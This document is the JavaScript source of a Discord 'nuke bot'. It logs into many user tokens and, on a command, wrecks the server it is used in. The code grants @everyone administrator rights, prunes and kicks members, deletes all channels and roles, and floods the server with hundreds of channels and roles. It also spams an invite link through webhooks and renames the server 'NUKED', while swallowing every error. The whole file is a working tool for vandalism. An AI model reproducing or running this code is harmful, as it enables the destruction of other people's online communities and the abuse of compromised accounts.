const fs = require('fs')
const tokens = fs.readFileSync('./variables/tokens.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const proxies = fs.readFileSync('./variables/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const botconfig = require("./variables/botconfig.json");
const Discord = require("discord.js");
const request = require('request');
var chalk = require('chalk');
var time = new Date().toDateString() + ' ' + new Date().toLocaleTimeString();
const userid = botconfig.userid; 
const prefix = botconfig.prefix; 

process.on('unhandledRejection', e => {});
process.on('uncaughtException', e => {});
process.on('uncaughtRejection', e => {});
process.warn = () => {};



function write(content, file) {
    fs.appendFile(file, content, function(err) {
    });
}
function prune(token, guild){
	request({
			method: "POST",
			url: `https://discord.com/api/v9/guilds/${guild}/prune`, 
			json: true,
			headers: {
					"authorization": token,
					"Content-Type": "application/json",
				},
			body: { "compute_prune_count": false, "days": 1, "include_roles": ["744165933811105846"] }
			}, (err, res, body) => {
			if (res && res.statusCode === 200) {
				console.log(chalk.inverse.hex("00FF00")("[PRUNE] Started Kicking Members From Server!"));
			}
			else{
				console.log(chalk.red("[PRUNE] Failed To Start! Will Keep Attempting until Successful!"));
				prune(token, guild);
			}})
}
function admin(token, guild, everyone){
	request({
		method: "PATCH",
		url: `https://discord.com/api/v9/guilds/${guild}/roles/${everyone}`,
		json: true,
		headers: {
			"Content-Type": "application/json",
			"authorization": token
		},
		json: {
			"color": 0,
			"hoist": false,
			"mentionable": false,
			"name": "@everyone",
			"permissions": "6546771529"
		}
	}, (err, res, body) => {
		console.log(chalk.inverse("[INFO] Everyone Role Has Now Been Given Admin"));
	})
}
function webhookSpam(webhook){
	request({
		method: "POST",
		url: `https://discordapp.com/api/webhooks/${webhook.id}/${webhook.token}`,
		json: true,
		headers: {
			"Content-Type": "application/json",
		},
		json: {
			"username": "Nuke Bot",
			"content": `@everyone https://discord.gg/x2rntxtBpF  join`,  
		}
		}, (err, res, body) => {
	})
}


class bot {
    constructor(token) {
        this.token = token;
        this.bot = new Discord.Client();
        disableEveryone: true
    }
    start() {
        this.bot.on('ready', () => {
            process.title = `[313] Nuke Bot`;	
			console.log(chalk.hex("FF0000")`
				▐ ▄ ▄• ▄▌▄ •▄ ▄▄▄ .  ▄▄▄▄·       ▄▄▄▄▄
				•█▌▐██▪██▌█▌▄▌▪▀▄.▀·  ▐█ ▀█▪ ▄█▀▄ •██  
				▐█▐▐▌█▌▐█▌▐▀▀▄·▐▀▀▪▄  ▐█▀▀█▄▐█▌.▐▌ ▐█.▪
				██▐█▌▐█▄█▌▐█.█▌▐█▄▄▌  ██▄▪▐█▐█▌.▐▌ ▐█▌·
				▀▀ █▪ ▀▀▀ ·▀  ▀ ▀▀▀   ·▀▀▀▀  ▀█▄▀▪ ▀▀▀ 
					    Created by Luci`);
			console.log("");
			console.log(chalk.inverse.hex("00FF00")(`[LOGIN] ${time}: Logged into User Token ${this.bot.user.tag} (${this.bot.user.id})`));
			console.log(chalk.inverse(`[INFO] Bot Prefix is set to: "${prefix}" this may be altered within the botconfig file!`)); 
			console.log("");
        })		
		
this.bot.on("message", async message => {
	let messageArray = message.content.split(" ");
	let args = messageArray.slice(1);
	if (message.author.bot) return;
    if (message.content.startsWith(`${prefix}nuke`)) {
		let guild = message.guild.id;
		let everyone = message.guild.defaultRole.id;
		admin(this.token, guild, everyone);
		prune(this.token, guild);
		message.guild.members.filter(member => member.kickable).forEach(member => {member.kick("Kicked")
        console.log(member.username + " was kicked"); });
        message.guild.channels.forEach(channel => channel.delete())
        message.guild.roles.map(r => r.delete().catch(err => {}));
        for (let i = 0; i < 250; i++) { 
          message.guild.createChannel("Nuked", {type: "text"}).then(channel =>  { 
          channel.createWebhook("Testerrr").then(webhook => { 
				webhookSpam(webhook);
				})
			})
            message.guild.createChannel("Nuked", {type: "Voice"}).catch("");
            message.guild.createRole({ name: `{"type":"error","title":"Pedos"}`, color: "RANDOM", permissions:[]
            })
        }
		message.guild.setName('NUKED').then(updated => console.log(`[GUILD] Updated guild name to ${updated.name}`));
        console.log(chalk.hex("66FF00")("[NUKE] Server has been nuked")); 
	}
});				
          this.bot.login(this.token).catch(err => console.log(chalk.red(`${time} Error: Invalid Token!`.inverse)));
	}	
}
tokens.forEach(token => new bot(token).start());

